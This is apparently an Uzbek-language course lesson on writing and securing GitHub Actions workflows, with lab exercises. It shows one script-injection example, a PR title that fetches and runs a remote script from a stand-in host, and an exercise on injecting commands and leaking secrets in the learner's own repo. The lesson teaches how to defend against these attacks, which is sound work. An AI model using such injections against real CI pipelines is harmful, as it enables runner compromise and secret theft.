# 2-dars: GitHub Actions

Maqsad: GitHub Actions'da workflow'ni noldan yozish, xavfsiz sozlash va debug qilishni o'rganish. 1-darsda pipeline'ni lokal `Makefile` sifatida qurdingiz, endi o'sha target'larni GitHub runner'ida ishga tushirasiz va ustiga matrix, cache, artifact, image'ni GHCR'ga push qilish va approval qo'shasiz. Bu modulning asosiy asbobi: 3- va 4-darslarda shu pipeline GitLab CI va Jenkins'ga ko'chiriladi, 5-darsda unga deploy job'i qo'shiladi.

Taxminiy vaqt: 4 kun (siz uchun). YAML va GitHub oqimi tanish, diqqatni quyidagilarga qarating: `GITHUB_TOKEN` permissions, action'larni SHA bo'yicha pin qilish, expression'lar orqali script injection, secret'lar qaysi trigger'da berilmasligi, cache kaliti qanday ishlashi, `needs` bilan job grafi, `gh run` bilan debug.

## Laboratoriya

- GitHub'da alohida **public** repo `cicd-demo`. Public repo'da standart hosted runner'lar bepul va environment himoya qoidalari (required reviewers) mavjud. Private repo'da bepul tarifda oylik daqiqa limiti bor va ba'zi himoya qoidalari ishlamaydi.
- Repo'ga 1-darsdagi `app/`, `Dockerfile`, `Makefile` ko'chiriladi. Workflow fayllari faqat repo ildizidagi `.github/workflows/` da ishlaydi, shuning uchun ular o'quv repozitoriysida emas, `cicd-demo` da turadi.
- Ish papkasi `cicd/02-github-actions/`: `README.md` ga javoblar, run havolalari (`gh run view --web` dan), va workflow fayllarining yakuniy nusxasi.
- Asboblar: `gh` (o'rnatilgan, `gh auth status` bilan tekshiring). Workflow sintaksisini lokal tekshirish uchun `actionlint` konteynerda: `docker run --rm -v "$PWD":/repo --workdir /repo rhysd/actionlint:latest -color`.
- Tozalash: dars oxirida sinov package versiyalarini GHCR'dan o'chiring, self-hosted runner ro'yxatdan o'tkazgan bo'lsangiz uni repo sozlamalaridan olib tashlang va konteynerini o'chiring.

**Tuzoq: workflow faylini push qilish huquqi.** `gh` token'i bilan HTTPS orqali `.github/workflows/` ichidagi faylni push qilganda `workflow` scope yo'qligi haqida rad javobi kelsa: `gh auth refresh -s workflow`.

---

## 1. Workflow tuzilishi

Workflow bu `.github/workflows/` ichidagi YAML fayl. Uch asosiy kalit: `on` (qachon), `jobs` (nima), har job ichida `steps` (qanday).

```yaml
name: ci
on:
  push:
    branches: [main]
  pull_request:
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - run: make test
```

- Har job alohida yangi VM'da ishlaydi. Job'lar standart holatda parallel, tartib `needs` bilan beriladi.
- Step ikki xil: `uses` (tayyor action) yoki `run` (shell buyrug'i, Linux'da standart `bash -e`).
- Repo kodi runner'da o'z-o'zidan paydo bo'lmaydi, `actions/checkout` uni klonlaydi.
- `runs-on: ubuntu-latest` vaqt o'tishi bilan yangi Ubuntu versiyasiga siljiydi. Takrorlanuvchanlik uchun aniq versiya (`ubuntu-24.04`) yozgan ma'qul.

### Trigger'lar

| Trigger | Qachon | Eslatma |
|---------|--------|---------|
| `push` | branch yoki tag'ga push | `branches`, `tags`, `paths` filtrlari |
| `pull_request` | PR ochilganda, yangilanganda | fork'dan kelgan PR'ga secret berilmaydi, token read-only |
| `workflow_dispatch` | qo'lda (UI, `gh workflow run`) | `inputs` qabul qiladi |
| `schedule` | cron (UTC) | faqat default branch'dagi fayl ishlaydi |
| `workflow_call` | boshqa workflow chaqirganda | reusable workflow |
| `pull_request_target` | PR, lekin base branch kontekstida | secret'lar beriladi, xavfli |

**Tuzoq: `pull_request_target` bilan PR kodini checkout qilish.** Bu trigger secret'larga va yozish huquqli token'ga ega. Agar workflow fork'dagi kodni checkout qilib ishga tushirsa (`npm install`, `make`), begona kod sizning secret'laringiz bilan ishlaydi. Aniq zarurat bo'lmasa bu trigger'ni ishlatmang.

### Job grafi

```yaml
jobs:
  lint: { ... }
  test: { ... }
  build:
    needs: [lint, test]
  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
```

GitHub Actions'da "stage" tushunchasi yo'q, graf `needs` bilan quriladi. `needs` dagi job muvaffaqiyatsiz bo'lsa, bog'liq job'lar o'tkazib yuboriladi (skipped). Job natijasini keyingisiga uzatish: `outputs` (kichik satrlar) yoki artifact (fayllar).

## 2. Action'lar va pin qilish

Action bu qayta ishlatiladigan step: JavaScript, Docker konteyner yoki composite (step'lar to'plami). `uses: owner/repo@ref` shaklida chaqiriladi, `ref` bu tag, branch yoki commit SHA.

Muammo: tag o'zgaruvchan. `@v4` bugun bir kodga, ertaga boshqasiga ishora qilishi mumkin. Action sizning runner'ingizda, sizning token va secret'laringiz bilan ishlaydi. Action reposi buzib kirilsa va tag ko'chirilsa, hujumchi kodi keyingi run'da sizning secret'laringizni o'qiydi. Bunday supply chain hujumlari amalda bo'lgan.

```yaml
- uses: actions/checkout@<40-char-commit-sha> # v4.x.y
```

- To'liq commit SHA o'zgarmas. Yonidagi komment qaysi versiya ekanini odam uchun saqlaydi.
- SHA'larni qo'lda yangilash og'ir, shuning uchun Dependabot (`.github/dependabot.yml`, `package-ecosystem: github-actions`) yangi versiyaga PR ochadi.
- Amaliy siyosat: `actions/*` va `github/*` (GitHub'ning o'zi) uchun major tag qabul qilinadi, uchinchi tomon action'lari SHA bilan pin qilinadi. Qat'iy muhitlarda hammasi SHA bilan.
- Shu darsdagi misollarda qisqalik uchun major tag yozilgan. Joriy major versiyani har action'ning releases sahifasidan tekshiring, vazifalarda esa SHA'ga o'tkazasiz.

## 3. Context va expression'lar

`${{ ... }}` ichidagi ifoda runner'da emas, GitHub tomonida, step ishga tushishidan oldin hisoblanadi va natija matn sifatida joyiga qo'yiladi.

| Context | Ichida nima | Misol |
|---------|-------------|-------|
| `github` | hodisa, repo, ref, SHA | `github.sha`, `github.ref_name`, `github.event_name`, `github.actor` |
| `env` | workflow/job/step `env` qiymatlari | `env.NODE_VERSION` |
| `vars` | konfiguratsiya variable'lari (ochiq) | `vars.APP_URL` |
| `secrets` | secret'lar | `secrets.DEPLOY_KEY` |
| `matrix` | joriy matrix kombinatsiyasi | `matrix.node` |
| `needs` | oldingi job'lar natijasi va output'lari | `needs.build.outputs.tag` |
| `steps` | shu job'dagi oldingi step'lar | `steps.meta.outputs.tags` |
| `runner` | runner haqida | `runner.os`, `runner.temp` |
| `inputs` | `workflow_dispatch`/`workflow_call` kirishlari | `inputs.environment` |

Funksiyalar: `contains()`, `startsWith()`, `endsWith()`, `format()`, `hashFiles()`, `toJSON()`, `fromJSON()`. Holat funksiyalari `if` da: `success()` (standart), `failure()`, `always()`, `cancelled()`.

```yaml
- name: Report failure
  if: failure()
  run: echo "previous step failed"
```

Step'lar orasida qiymat uzatish fayl orqali: `echo "tag=abc" >> "$GITHUB_OUTPUT"` (keyin `steps.<id>.outputs.tag`), `echo "FOO=bar" >> "$GITHUB_ENV"` (keyingi step'larda env), `$GITHUB_STEP_SUMMARY` ga yozilgan Markdown run sahifasida ko'rinadi.

**Tuzoq: script injection.** Expression matn almashtirish bo'lgani uchun, `run: echo "${{ github.event.pull_request.title }}"` da PR sarlavhasi shell kodiga aylanadi. Sarlavhasi `"; curl evil.sh | sh; "` bo'lgan PR runner'da buyruq bajaradi. Foydalanuvchi boshqaradigan qiymatlar (PR sarlavhasi, branch nomi, commit xabari, issue matni) `run` ichiga to'g'ridan qo'yilmaydi, `env` orqali o'tkaziladi:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

## 4. Matrix

Bitta job ta'rifidan kombinatsiyalar bo'yicha bir nechta job hosil qiladi:

```yaml
strategy:
  fail-fast: false
  matrix:
    node: [22, 24]
    os: [ubuntu-24.04, ubuntu-24.04-arm]
runs-on: ${{ matrix.os }}
```

- `fail-fast` standart `true`: bitta kombinatsiya yiqilsa qolganlari bekor qilinadi. Qaysi kombinatsiyalar buzilganini to'liq ko'rish uchun `false`.
- `include` qo'shimcha kombinatsiya yoki maydon qo'shadi, `exclude` olib tashlaydi, `max-parallel` parallellikni cheklaydi.
- Matrix job'lari soni ko'paytma: 3 × 3 × 2 = 18 job. Har biri runner daqiqasi.

## 5. Cache va artifact

### Cache
`actions/cache` kalit bo'yicha papkani saqlaydi va tiklaydi. Kalit aniq mos kelsa tiklanadi va job oxirida qayta saqlanmaydi (cache yozuvi o'zgarmas).

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: npm-${{ runner.os }}-
```

- `restore-keys` aniq kalit topilmaganda prefiks bo'yicha eng yangi mosini beradi (qisman foyda).
- Cache branch bo'yicha ajratilgan: job o'z branch'i va default branch cache'ini o'qiy oladi, boshqa feature branch'nikini yo'q. PR birinchi run'da `main` cache'idan foydalanadi.
- `actions/setup-node` da `cache: npm` parametri shu ishni o'zi qiladi.
- Docker build uchun: `docker/build-push-action` da `cache-from: type=gha` va `cache-to: type=gha,mode=max` layer'larni GitHub cache'ida saqlaydi.

### Artifact
`actions/upload-artifact` fayllarni run'ga biriktiradi, `actions/download-artifact` boshqa job'da oladi. Standart saqlash muddati 90 kun, `retention-days` bilan qisqartiriladi. Test hisoboti, coverage, build natijasi shu yerda.

**Tuzoq: artifact ichidagi secret.** Public repo'da artifact'ni har kim yuklab oladi. `.env`, kubeconfig yoki butun ishchi papkani artifact qilib yuklash secret'ni ochadi.

## 6. Secret'lar, variable'lar, environment'lar

| | Secrets | Variables |
|-|---------|-----------|
| Qiymat | shifrlangan, yozilgach o'qib bo'lmaydi | ochiq matn |
| Log'da | maskalanadi | ko'rinadi |
| Context | `secrets.NAME` | `vars.NAME` |
| CLI | `gh secret set NAME` | `gh variable set NAME` |

Darajalar: organization, repository, environment. Environment darajasidagi secret faqat o'sha environment'ni e'lon qilgan job'ga beriladi.

- Secret'lar job'ga avtomatik env sifatida tushmaydi, har step'ga aniq uzatiladi (`env:` yoki `with:`).
- Fork'dan kelgan `pull_request` run'iga secret'lar berilmaydi (`GITHUB_TOKEN` dan tashqari, u ham read-only).
- `if:` ichida `secrets` context'ini to'g'ridan ishlatib bo'lmaydi, avval `env` ga oling.

### Environment va approval

```yaml
deploy:
  runs-on: ubuntu-24.04
  environment:
    name: production
    url: https://app.example.com
```

Environment (Settings → Environments) bu deploy nishoni obyekti. Unga biriktiriladi: o'z secret va variable'lari, **required reviewers** (job tasdiqlanmaguncha kutadi), wait timer, **deployment branches** (faqat `main` dan deploy). Run sahifasida va repo'ning Deployments bo'limida kim nimani qachon chiqargani ko'rinadi. Bu 1-darsdagi gate va deployment history.

## 7. GITHUB_TOKEN va permissions

Har run boshida GitHub avtomatik `GITHUB_TOKEN` yaratadi: faqat shu repo uchun, job tugashi bilan bekor bo'ladi. Uni PAT (personal access token) o'rniga ishlating: PAT uzoq yashaydi va egasining barcha repo'lariga huquq beradi.

Token huquqlari `permissions` bilan cheklanadi, workflow yoki job darajasida:

```yaml
permissions:
  contents: read
jobs:
  publish:
    permissions:
      contents: read
      packages: write
```

- `permissions` yozilgan zahoti sanalmagan barcha scope'lar `none` bo'ladi.
- Workflow boshida `contents: read` berib, kengroq huquqni faqat kerakli job'ga qo'shish standart amaliyot.
- Ko'p uchraydigan scope'lar: `contents` (repo), `packages` (GHCR), `pull-requests`, `id-token` (OIDC, 5-darsda), `actions`.
- `GITHUB_TOKEN` bilan qilingan push yangi workflow run'ini boshlamaydi (cheksiz sikldan himoya).

## 8. Qayta ishlatish: reusable workflow va composite action

| | Reusable workflow | Composite action |
|-|-------------------|------------------|
| Nima | butun workflow (job'lar bilan) | step'lar to'plami |
| Ta'rif | `on: workflow_call` | `action.yml`, `runs.using: composite` |
| Chaqirish | job darajasida `uses:` | step darajasida `uses:` |
| Runner | o'z job'lari, o'z runner'lari | chaqirgan job ichida |
| Secret | `secrets:` bilan aniq yoki `secrets: inherit` | to'g'ridan yo'q, `inputs` orqali |

```yaml
jobs:
  call-build:
    uses: ./.github/workflows/build.yml
    with:
      image-name: cicd-demo
    secrets: inherit
```

Composite action'da har `run` step'ida `shell:` yozish majburiy. Tanlov: bir necha repo'da bir xil "test, build, push" zanjiri kerak bo'lsa reusable workflow, bir necha job'da takrorlanadigan 3–4 step (masalan Node o'rnatish va cache) uchun composite action.

## 9. Concurrency

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

Bir xil `group` dagi run'lardan bir vaqtda faqat bittasi ishlaydi. `cancel-in-progress: true` eski run'ni bekor qiladi: PR'ga ketma-ket push qilinganda faqat oxirgisi tekshiriladi, daqiqalar tejaladi.

**Tuzoq: deploy job'ida `cancel-in-progress: true`.** Yarim yo'lda bekor qilingan deploy serverni noaniq holatda qoldiradi. Deploy uchun `group: deploy-production` va `cancel-in-progress: false`: deploy'lar navbat bilan ketadi, parallel ikki deploy bo'lmaydi.

## 10. Docker image'ni GHCR'ga push qilish

GHCR (`ghcr.io`) GitHub'ning container registry'si. `GITHUB_TOKEN` ga `packages: write` berilsa, alohida secret kerak emas.

```yaml
- uses: docker/login-action@v3
  with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}
- uses: docker/build-push-action@v6
  with:
    context: .
    push: ${{ github.event_name != 'pull_request' }}
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
```

- Image nomi kichik harflarda bo'lishi shart. Owner yoki repo nomida katta harf bo'lsa `ghcr.io/${{ github.repository }}` xato beradi, `docker/metadata-action` nomni va tag'larni to'g'ri hosil qiladi.
- PR'da image quriladi (Dockerfile buzilmaganini tekshirish), lekin push qilinmaydi: fork PR'ida yozish huquqi yo'q, va tekshirilmagan kod registry'ga tushmasligi kerak.
- Tag sifatida commit SHA (1-darsdagi immutable tag). `latest` ni qo'shimcha qulaylik sifatida qo'yish mumkin, lekin deploy hech qachon unga tayanmaydi.
- Yangi package standart holatda private va uni yaratgan repo'ga bog'lanadi. Ko'rinishi package sozlamalaridan o'zgartiriladi.

## 11. Debug

- Run log'i: `gh run list`, `gh run view <id> --log-failed` (faqat yiqilgan step'lar), `gh run watch` (jonli kuzatish), `gh run view --web`.
- Qayta ishga tushirish: `gh run rerun <id> --failed` (faqat yiqilgan job'lar), `gh run rerun <id> --debug` (debug log bilan).
- Doimiy debug log: repo'da `ACTIONS_STEP_DEBUG` ni `true` qilib qo'yish (secret yoki variable).
- Qo'lda ishga tushirish: `gh workflow run ci.yml --ref my-branch -f key=value` (`workflow_dispatch` kerak).
- Context'ni ko'rish: `run: echo "$GITHUB_CONTEXT"` va `env: GITHUB_CONTEXT: ${{ toJSON(github) }}`. `secrets` context'ini hech qachon bunday chop etmang.
- Push'dan oldin: `actionlint` sintaksis, expression va `run` ichidagi shell xatolarini (shellcheck orqali) topadi.

Eng samarali debug usuli 1-darsdan: mantiq `Makefile` da bo'lsa, xatoni lokal `make test` bilan takrorlaysiz va "commit, push, 3 daqiqa kut" siklidan qutulasiz.

## 12. Self-hosted runner

Self-hosted runner bu o'z mashinangizda ishlaydigan agent dastur. U GitHub'ga chiquvchi HTTPS ulanish ochadi va job kutadi, kiruvchi port ochish kerak emas. Qachon kerak: yopiq tarmoqdagi resurslarga kirish, maxsus apparat (GPU, ARM), katta cache, hosted daqiqalar narxi.

Xavflari:

- **Public repo'da ishlatmang.** Har kim fork ochib PR yuborishi va workflow orqali sizning mashinangizda ixtiyoriy kod bajarishi mumkin.
- Hosted runner har job'dan keyin yo'q qilinadi, self-hosted esa standart holatda doimiy: oldingi job'dan qolgan fayllar, Docker image'lar, credential'lar keyingi job'ga ko'rinadi.
- Runner jarayoni mashinadagi tarmoqqa, Docker socket'ga, cloud metadata endpoint'iga kira oladi. Runner'ni buzish ichki tarmoqqa kirish demak.
- Yumshatish: ephemeral runner'lar (bitta job, keyin yo'q qilinadi; `config.sh` da `--ephemeral`), alohida izolyatsiyalangan VM, eng kam huquq, runner group'lar bilan qaysi repo foydalana olishini cheklash, runner dasturini yangilab turish.

Label'lar orqali tanlanadi: `runs-on: [self-hosted, linux, x64]`.

## Tuzoqlar

- `permissions` yozmaslik. Repo sozlamasiga qarab token keng yozish huquqiga ega bo'lishi mumkin, buzilgan action undan foydalanadi.
- Uchinchi tomon action'ini tag bilan (`@v1`, `@main`) ishlatish. Tag ko'chirilsa begona kod secret'laringiz bilan ishlaydi.
- `${{ github.event.* }}` ni `run` ichiga to'g'ridan qo'yish (script injection).
- `pull_request_target` da PR kodini checkout qilib bajarish.
- Deploy job'ida `cancel-in-progress: true`.
- Cache kalitiga lockfile hash'ini qo'shmaslik: dependency o'zgaradi, cache esa eski.
- `if: always()` ni deploy step'iga qo'yish: testlar yiqilgan bo'lsa ham deploy bo'ladi.
- Public repo'ga self-hosted runner ulash.
- Secret'ni `echo` bilan "tekshirish" yoki uni base64 qilib chop etish. Maskalash buni ushlamaydi.
- `ubuntu-latest` va `node-version: latest`: pipeline kod o'zgarmasa ham bir kuni buziladi.

## Manbalar

- https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions – workflow sintaksisi (asosiy ma'lumotnoma)
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions – xavfsizlik bo'yicha qo'llanma (majburiy)
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication – `GITHUB_TOKEN` va permissions
- https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs – context'lar
- https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows – cache
- https://docs.github.com/en/actions/sharing-automations/reusing-workflows – reusable workflow
- https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment – environment'lar
- https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry – GHCR
- https://docs.github.com/en/actions/hosting-your-own-runners – self-hosted runner'lar
- https://cli.github.com/manual/gh_run – `gh run`
- https://github.com/rhysd/actionlint – actionlint
- https://github.com/docker/build-push-action – Docker build va push action

---

## Vazifalar

Workflow'lar `cicd-demo` reposida yoziladi. Javoblar `cicd/02-github-actions/` da (yaratish: `make new m=cicd n=02 name=github-actions`), shu papkadagi `README.md` ga `## N. Title` sarlavhalari ostida: bajarilgan buyruqlar, run havolasi, log'ning muhim qismi va o'z so'zingiz bilan izoh. Workflow fayllarining yakuniy nusxasini ham shu papkaga saqlang.

### A. Birinchi workflow

1. **Repo setup.** `gh repo create` bilan public `cicd-demo` reposini yarating, 1-darsdagi `app/`, `Dockerfile`, `Makefile` ni ko'chirib push qiling. `main` uchun branch protection (yoki ruleset) yoqing: to'g'ridan push taqiqlangan, PR va status check talab qilinadi (check nomini 2-vazifadan keyin qo'shasiz).

2. **First workflow.** `.github/workflows/ci.yml` yozing: `push` (`main`) va `pull_request` da `lint` va `test` job'lari parallel ishlasin, ikkalasi ham `Makefile` target'larini chaqirsin. PR ochib run'ni `gh run watch` bilan kuzating. Runner'da qaysi OS va qaysi Docker versiyasi borligini log'dan toping.

3. **Break and read.** Testni ataylab buzib push qiling. `gh run view --log-failed` bilan faqat xato qismini oling. PR'ni merge qilib bo'ladimi? `gh run rerun --failed` nima qilishini kod tuzatilmagan holatda sinab ko'ring va natijani izohlang.

4. **actionlint.** Workflow'ga ataylab uch xil xato kiriting: noto'g'ri kalit nomi, mavjud bo'lmagan context maydoni, `run` ichida shellcheck ushlaydigan xato. `actionlint` ni konteynerda ishga tushirib har birini qanday xabar bilan topganini yozing. Qaysi xatoni GitHub push'dan keyin ham topmagan bo'lardi?

5. **Contexts dump.** Alohida `debug.yml` (`workflow_dispatch`) yozing: `github`, `runner` va `job` context'larini `toJSON` bilan chop etsin. `gh workflow run` bilan ishga tushiring. `github.ref`, `github.ref_name`, `github.sha`, `github.event_name` qiymatlarini push va PR run'lari uchun taqqoslang. PR run'ida `github.sha` qaysi commit va nima uchun u branch'ingizdagi oxirgi commit emas?

### B. Tezlik va natijalar

6. **Matrix.** `test` job'ini Node'ning ikki LTS versiyasi bo'yicha matrix qiling. Bitta versiyada yiqiladigan test yozib (masalan `process.version` ga qarab), `fail-fast: true` va `false` holatlarida run qanday ko'rinishini taqqoslang.

7. **Cache.** npm cache qo'shing (`actions/cache` bilan qo'lda, `setup-node` ning `cache` parametrisiz). Uch run qiling: birinchi (cache miss), ikkinchi (hit), `package-lock.json` o'zgargandan keyin (miss, `restore-keys` bilan qisman). Har birida "Cache restored/saved" log qatorlari va dependency o'rnatish vaqtini yozing. `gh cache list` natijasini ko'rsating.

8. **Artifacts.** Test job'i JUnit yoki TAP hisobotini va coverage'ni artifact sifatida yuklasin, testlar yiqilganda ham (`if` sharti qanday bo'lishi kerak?). `gh run download` bilan lokal oling. `retention-days` ni 3 qilib qo'ying va nima uchun standart 90 kun har doim ham to'g'ri emasligini yozing.

9. **Job outputs.** `build` job'i qisqa SHA asosida image tag'ini hisoblab `outputs` orqali chiqarsin, keyingi job uni `needs.build.outputs.*` dan o'qib `$GITHUB_STEP_SUMMARY` ga yozsin. Output va artifact qachon qaysi biri ishlatilishini izohlang.

10. **Concurrency.** PR branch'iga 30 soniya ichida uch marta push qiling. Avval `concurrency` siz, keyin `cancel-in-progress: true` bilan. Nechta run to'liq ishladi? Deploy job'i uchun qanday `concurrency` sozlamasi kerak va nima uchun boshqacha?

### C. Xavfsizlik

11. **Token permissions.** Workflow boshiga `permissions: contents: read` qo'ying. Bitta step'da `gh` yoki `curl` orqali `GITHUB_TOKEN` bilan PR'ga komment yozishga urinib ko'ring, xatoni o'qing, so'ng faqat o'sha job'ga kerakli minimal permission'ni qo'shing. Repo sozlamalarida standart token huquqi qayerda belgilanishini toping.

12. **Pin by SHA.** Workflow'dagi barcha action'larni to'liq commit SHA bilan pin qiling (versiya komment'i bilan). SHA'ni qanday topganingizni yozing. `.github/dependabot.yml` qo'shib `github-actions` ekotizimini yoqing. Tag bilan pin qilishning aniq hujum ssenariysini 3–4 gapda tasvirlang.

13. **Script injection.** `debug.yml` ga `workflow_dispatch` input'ini `run` ichida `${{ inputs.msg }}` sifatida to'g'ridan ishlatadigan step qo'shing. Shunday input beringki, runner'da qo'shimcha buyruq (`id` yoki `ls`) bajarilsin. Keyin `env` orqali tuzating va xuddi shu input endi zararsiz ekanini ko'rsating. Mexanizmni izohlang.

14. **Secrets and masking.** `gh secret set DEMO_SECRET` va `gh variable set DEMO_VAR` qiling. Workflow'da ikkalasini chop eting, log'da nima ko'rinadi? Secret'ni `rev` yoki `base64` orqali o'tkazib chop eting. Xulosa yozing va shu zahoti secret'ni o'chiring. Fork'dan kelgan PR'da `secrets.DEMO_SECRET` qiymati nima bo'lishini hujjatdan toping.

### D. Image va deploy darvozasi

15. **Build and push to GHCR.** `build` job'i qo'shing: `lint` va `test` dan keyin image quradi, PR'da faqat build, `main` da `ghcr.io/<owner>/cicd-demo:<sha>` ga push. Faqat `GITHUB_TOKEN` ishlating, PAT yo'q. Push'dan keyin lokal mashinada `docker pull` va `docker run` qilib `/version` ni tekshiring. Image digest'ini yozing.

16. **Layer cache.** Build'ga `type=gha` cache qo'shing. Faqat `app/` dagi bitta faylni o'zgartirgan commit'da qaysi layer'lar cache'dan olinganini log'dan ko'rsating. `package.json` o'zgarganda nima bo'ladi? Build vaqtlarini taqqoslang.

17. **Environment approval.** `staging` va `production` environment'larini yarating. `production` ga o'zingizni required reviewer va deployment branch sifatida faqat `main` ni qo'ying. Hozircha deploy o'rnida `echo` qiladigan ikki job yozing: `staging` avtomatik, `production` tasdiqdan keyin. Har environment'ga bir xil nomli, turli qiymatli variable qo'ying va job to'g'risini olishini ko'rsating. Feature branch'dan `production` job'ini ishga tushirishga urinib ko'ring va xatoni yozing.

18. **Reusable workflow.** Build va push qismini `.github/workflows/build.yml` (`on: workflow_call`, input: image nomi, output: tag) ga chiqaring va `ci.yml` dan chaqiring. Keyin Node o'rnatish va cache step'larini `.github/actions/setup/action.yml` composite action'ga chiqaring. Qaysi biri qachon mos ekanini o'z tajribangiz asosida yozing.

19. **Self-hosted runner analysis.** Runner o'rnatmasdan, hujjat asosida yozing: self-hosted runner GitHub bilan qaysi yo'nalishda ulanadi, nima uchun public repo'da xavfli (aniq hujum qadamlari bilan), doimiy runner'da job'lar orasida nima saqlanib qoladi, ephemeral rejim buni qanday hal qiladi. Ixtiyoriy: private sinov reposiga konteyner yoki VM ichida runner ulab, `runs-on: self-hosted` job'ini ishga tushiring va oxirida o'chiring.

20. **Full pipeline.** Yakuniy `ci.yml`: `lint` va `test` (matrix, cache) parallel, keyin `build` (reusable, GHCR push faqat `main` da), keyin `deploy-staging` (avtomatik), keyin `deploy-production` (approval). Har job minimal `permissions` bilan, action'lar SHA bilan, PR uchun `cancel-in-progress`. Run grafining ko'rinishini va PR'dan `main` gacha to'liq oqim vaqtini `README.md` ga yozing. Bu fayl 3–5-darslar uchun asos.

### Topshirish

Tayyor bo'lgach:
1. `actionlint` barcha workflow'larda toza.
2. `main` dagi oxirgi run yashil, `production` job'i approval kutgan va tasdiqlangan.
3. GHCR'da commit SHA bilan teglangan image bor, `latest` ga tayanilmagan.
4. `DEMO_SECRET` o'chirilgan, repo'da va log'larda hech qanday haqiqiy secret yo'q.
5. Ish papkasida `README.md` va workflow fayllari nusxasi bor, `make check` toza.
6. Menga xabar bering, repo havolasini qo'shing.

### O'zini tekshirish savollari (kodsiz, o'z so'zingiz bilan javob bering)

- Job va step orasidagi farq nima? Fayllar qaysi darajada bo'lishiladi?
- `${{ }}` ifodasi qayerda va qachon hisoblanadi? Script injection shundan qanday kelib chiqadi?
- `GITHUB_TOKEN` PAT'dan nimasi bilan xavfsizroq? `permissions` yozilganda sanalmagan scope'lar nima bo'ladi?
- Nima uchun uchinchi tomon action'i tag emas, SHA bilan pin qilinadi?
- Fork'dan kelgan PR'ga secret'lar nima uchun berilmaydi? `pull_request_target` buni qanday o'zgartiradi?
- Cache kalitida `hashFiles('**/package-lock.json')` nima uchun kerak? `restore-keys` nima qiladi?
- Environment'ning required reviewers qoidasi 1-darsdagi qaysi tushunchani amalga oshiradi?
- Reusable workflow va composite action farqi nima?
- Nima uchun deploy job'ida `cancel-in-progress: true` xavfli?
- Self-hosted runner public repo'da nima uchun xavfli?
